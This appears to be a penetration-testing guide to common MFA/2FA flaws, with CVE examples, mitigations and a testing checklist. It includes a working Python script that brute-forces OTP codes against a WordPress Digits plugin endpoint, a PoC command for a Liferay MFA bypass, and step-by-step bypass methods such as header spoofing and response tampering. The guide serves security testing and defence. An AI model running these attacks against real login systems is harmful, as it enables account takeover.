# MFA/2FA Security Testing Guide

## Common Flaws and Exploitation Techniques

Multi-Factor Authentication (MFA) and Two-Factor Authentication (2FA) are critical security controls, but they are frequently implemented incorrectly. Below is a comprehensive guide to common MFA/2FA flaws, real-world exploitation techniques, and examples from actual vulnerabilities discovered in production systems.

---

## 1. Lack of Rate Limiting

Rate limiting is one of the most fundamental protections against brute-force attacks on OTP verification endpoints. When missing, attackers can systematically guess valid codes.

### Exploitation Method

1. Request a 2FA code and capture this request using Burp Suite or similar proxy tool
2. Repeat this request 100-200 times to verify if any limitation is set on OTP generation requests
3. Navigate to the 2FA code verification page and attempt to brute-force valid 2FA codes
4. Monitor responses for any success indicators (status code change, response length difference, or success message)
5. You can also initiate OTP requests on one side while brute-forcing on another - statistically, an OTP may match during this window

### Real-World Example

**CVE-2025-4094: WordPress Digits Plugin Authentication Bypass**

The Digits plugin for WordPress (versions prior to 8.4.6.1) was vulnerable to OTP brute-force attacks due to missing rate limiting . Attackers could exploit this to bypass authentication or password reset by iterating over possible OTP values.

**Exploit Code Example:**
```python
import requests

def brute(otp):
    url = "https://example.com/wp-admin/admin-ajax.php"
    data = {
        "login_digt_countrycode": "+",
        "digits_phone": "000000000",
        "sms_otp": otp,
        "action": "digits_forms_ajax",
        "type": "forgot"
    }
    response = requests.post(url, data=data)
    if '"success":true' in response.text:
        print(f"[+] OTP FOUND: {otp}")

for otp in range(0, 10000):
    brute(f"{otp:04d}")
```

**CVSS Score:** 9.8 (Critical) | **CWE-287:** Improper Authentication

---

## 2. Rate Limit Bypass Techniques

Even when rate limiting is implemented, it can often be bypassed using various techniques.

### Bypass Methods

**Limiting the flow rate** - Some implementations only track attempts per second but allow unlimited attempts over longer periods

**Generated OTP code doesn't change** - The same OTP remains valid for multiple attempts, allowing gradual brute-forcing

**Rate-limit resetting when updating the code** - Requesting a new OTP resets the attempt counter for the previous code

**Bypassing by changing IP address** - Rate limiting tied to IP address can be bypassed using IP rotation (VPN, proxy pools, or IPv6 ranges)

**Support for X-Forwarded-For header** - If the application trusts X-Forwarded-For headers, attackers can spoof IP addresses by injecting arbitrary values

### Educational Lab Setup

A rate limit bypass laboratory has been developed using Flask that demonstrates these techniques . The lab implements OTP verification with rate limiting that locks users after three failed attempts. The bypass method involves:

1. Enter a phone number and navigate to the OTP page
2. Input incorrect OTPs three times to trigger the rate limit
3. Capture the OTP request using Burp Suite
4. Modify the request in Repeater and resend to access the dashboard

---

## 3. Authentication Bypass via HTTP Method Manipulation

**CVE-2025-3639: Liferay Portal/DXP MFA Bypass**

A critical vulnerability was discovered in Liferay Portal (versions 7.3.0 through 7.4.3.132) and Liferay DXP where an unauthenticated user with valid credentials could bypass MFA by converting a POST request to a GET request .

### Exploitation Method

Normal flow: POST /login (credentials + MFA verification) -> Access granted
Attack flow: GET /login (credentials only) -> MFA checks bypassed

**PoC Execution:**
```bash
python3 poc.py --target http://example.com --username user@example.com --password Test123!
```

**Impact:** The server improperly validated HTTP methods on authentication endpoints, allowing GET requests to skip MFA verification entirely. Active exploits were publicly available on GitHub.

**CVSS v4.0:** Low severity (Confidentiality, Integrity, Availability degradation)
**CWE-288:** Authentication Bypass Using an Alternate Path or Channel

**Mitigation:**
- Implement strict HTTP method validation on authentication endpoints
- Reject GET requests for login operations
- Apply patches: Liferay Portal 7.4.3.133+, Liferay DXP update 93+

---

## 4. Response Manipulation Attacks

Attackers can manipulate server responses to bypass 2FA verification when the frontend relies solely on client-side validation.

### Response Body Manipulation

**CVE-2025-56689: One Identity Safeguard OTP Bypass**

One Identity Safeguard for Privileged Passwords Appliance 7.5.1.20903 was vulnerable to OTP/MFA bypass using response manipulation . An attacker who intercepts or captures a valid OTP response could bypass OTP verification by replaying the same response.

**Note:** This vulnerability was disputed by the supplier, who stated that by design, the product successfully authenticates clients possessing a valid cookie whose validity time interval includes the current time.

### HTTP Response Status Code Manipulation

Some applications rely on HTTP status codes (200 OK vs 401 Unauthorized) to determine authentication success on the frontend. Attackers can intercept the response and modify the status code from 401 to 200, potentially gaining access.

---

## 5. Direct Request / Forced Browsing (Path Bypass)

When 2FA verification is only enforced on specific pages but not on subsequent authenticated endpoints, attackers can bypass the verification step entirely.

### Exploitation Method

1. Normal flow: Login -> MFA -> Profile/Dashboard
2. Attack flow: Login -> MFA page, instead of entering MFA code, navigate directly to Profile URL
3. If the Profile endpoint doesn't verify that MFA was completed, access is granted

### Real-World Example

**Cryptocurrency P2P Platform 2FA Bypass (2025)**

While testing a cryptocurrency P2P platform with over 2 million users, a researcher discovered that 2FA was enforced only on the frontend - the backend never verified the OTP . This allowed an attacker to:

1. Add attacker-controlled payment methods to any victim's account without OTP verification
2. Create sell orders from victim accounts offering their USDT
3. Select attacker's own bank details as the payout option
4. Receive funds without ever passing OTP verification

**Attack Chain:**
- Vulnerable endpoint accepted crafted requests to add payment methods
- Backend didn't verify OTP for this operation
- Poor session isolation allowed operations across user accounts

**Result:** Full USDT theft without ever completing 2FA verification. Fixed within 7 days of responsible disclosure.

---

## 6. Social Engineering and MFA Bypass

Technical controls can be rendered useless when users are manipulated into bypassing them.

### Real-World Example: Gmail App Password Attack (2025)

Russian hackers bypassed Google's MFA in Gmail by posing as US Department of State officials . The attack method:

1. Attackers posed as State Department representatives in private online conversations
2. Conversations CCed fabricated @state.gov email addresses (State Department's mail server accepts all messages without bounce responses)
3. Targets received official-looking documents with instructions to register for an "MS DoS Guest Tenant" account
4. Instructions required creating app-specific passwords (16-digit codes that bypass MFA)
5. Victims believed they were creating app passwords for secure government platform access
6. Instead, they gave attackers full access to their Google accounts

**Targets:** Prominent academics and critics of Russia
**Attribution:** Suspected Russian state-sponsored entity
**Campaign duration:** Several months

**Protection Recommendations:**
- Avoid using app passwords unless absolutely necessary
- Use authenticator apps or hardware security keys (FIDO2/WebAuthn) which are more resistant to phishing
- Regularly educate users about recognizing sophisticated phishing attempts

---

## 7. Adversary-in-the-Middle (AiTM) Attacks

Modern phishing platforms have evolved to bypass MFA using real-time proxying techniques.

### Mamba 2FA Platform (2024-2025)

Mamba 2FA is a Phishing-as-a-Service (PhaaS) platform targeting Microsoft 365 accounts at $250 per month . It captures authentication tokens through AiTM setups, bypassing MFA protections.

**Capabilities:**
- Intercepts and steals one-time passcodes and authentication cookies
- Uses Socket.IO JavaScript library for communication between phishing pages and backend relay servers
- Employs sandbox detection techniques (redirects analysis environments to Google 404 pages)
- Uses proxy servers from IPRoyal to conceal relay server IP addresses
- Delivers captured credentials and cookies via Telegram bot in real-time

**First documented:** June 2024 by Any.Run
**Activity traced:** Since May 2024 (possibly as early as November 2023)

### VoidProxy Platform (2025)

VoidProxy is another sophisticated phishing-as-a-service operation targeting Google and Microsoft accounts using adversary-in-the-middle techniques .

**Characteristics:**
- Dark Web advertisements appeared as early as August 2024
- Captures session tokens, MFA codes, and credentials
- Bypasses SMS codes and authenticator app OTPs
- Phishing lures sent from compromised legitimate email service providers (Constant Contact, Active Campaign)
- Uses reputation of legitimate providers to bypass spam filters

**Mitigation:** Okta Fastpass (passwordless authentication) flagged malicious activity. Phishing-resistant authenticators prevented credential sharing.

---

## 8. Session Management Flaws

### Previously Created Sessions Remain Valid After 2FA Activation

If a user activates 2FA on their account, all existing sessions should be invalidated. Failing to do so means an attacker who previously compromised a session maintains access even after the user enables 2FA.

### Bypass Using "Remember Me" Functionality

- If 2FA is attached using a cookie, the cookie value must be unguessable
- If 2FA is attached to an IP address, attackers can replace their IP address
- Session tokens may not be properly invalidated after 2FA verification

---

## 9. Insufficient Backend Validation

### Lack of Rate-Limiting with User ID Not Validated

When the OTP is validated but the associated user ID is not properly verified, attackers may be able to:
- Submit OTPs for different user accounts
- Replay OTPs across different sessions
- Associate their session with a different user's OTP

### Code Leakage in Response

OTP codes may inadvertently be leaked in server responses:
- Debug responses containing the generated OTP
- Error messages revealing partial codes
- OTP included in URL parameters (exposed in referrer headers, server logs, browser history)

### Cached OTP in Dynamic JavaScript Files

Some applications pre-generate OTPs and embed them in dynamically generated JavaScript files. Attackers can:
- Download and analyze JS files for embedded codes
- Look for patterns in code generation
- Extract OTPs before they are sent to users

---

## 10. Improper Access Control in Backup Codes

Backup codes are intended for account recovery when the primary 2FA method is unavailable. Common flaws include:

- Backup codes can be requested without re-authentication
- Backup codes are generated and displayed without verifying current password or 2FA
- Backup codes are stored insecurely or leaked in responses
- No rate limiting on backup code verification
- Backup codes are not invalidated after use

---

## 11. Edge Cases and Configuration Flaws

### 2FA Ignored Under Certain Circumstances

**Password recovery flow:** When resetting a password, 2FA may be skipped entirely

**Social login:** 2FA enforced for email/password login but not for OAuth/Social login

**Older application versions:** Different API versions may have different 2FA requirements

**Cross-platforming:** Mobile app may skip 2FA while web version requires it

### Real-World Example: Fortinet FortiGate 2FA Bypass (CVE-2020-12812)

FortiGate devices with specific LDAP configurations allowed users to bypass 2FA . The issue occurred due to case sensitivity differences:

**Prerequisites:**
- Local user entries on FortiGate with 2FA referencing back to LDAP
- Users are members of LDAP groups
- LDAP groups configured on FortiGate and used in authentication policies

**Exploitation:**
- User logs in with "jsmith" -> 2FA requested (matches local user)
- User logs in with "Jsmith" or "JSmith" -> FortiGate doesn't match local user
- FortiGate falls back to LDAP authentication directly
- LDAP authenticates successfully without 2FA

**Impact:** Admin or VPN users authenticated without 2FA. System configuration considered compromised.

**Mitigation:** Disable username case sensitivity using `set username-sensitivity disable`

---

## 12. API Version Manipulation

When applications maintain multiple API versions:
- Older API versions may lack MFA enforcement
- Version downgrade attacks can bypass security controls
- Developers may forget to implement MFA in new endpoints

**Testing approach:**
1. Identify all API versions available
2. Test each version for MFA enforcement
3. Attempt to force older API versions by modifying version headers or paths

---

## 13. OTP Code Reusability

A valid OTP should work only once. Common flaws include:
- OTP remains valid after successful verification
- OTP can be used multiple times within its validity window
- OTP works for multiple different operations (login, password reset, email change)

---

## Testing Checklist

| Flaw Category | Testing Method |
|---------------|----------------|
| Lack of rate limit | Send 100-200 rapid OTP verification requests; attempt brute-force |
| HTTP method bypass | Convert POST to GET, PUT, or other methods |
| Path bypass | Skip MFA page and directly access authenticated endpoints |
| Response manipulation | Intercept responses and modify status codes or body content |
| Session validation | Test if pre-2FA sessions remain active after 2FA activation |
| Backup codes | Attempt to request/use backup codes without proper authentication |
| API versioning | Test older API endpoints for missing MFA enforcement |
| OTP reusability | Attempt to reuse the same OTP multiple times |

---

## References and Further Reading

- NCC Group: Testing Two-Factor Authentication - research.nccgroup.com
- Cobalt.io: MFA Bypass Techniques - blog.cobalt.io
- iSecMax: Two-Factor Authentication Security Testing - medium.com/@iSecMax
- CVE-2025-4094 (WordPress Digits Plugin)
- CVE-2025-3639 (Liferay Portal/DXP)
- CVE-2025-56689 (One Identity Safeguard)
- CVE-2020-12812 (Fortinet FortiGate)

---
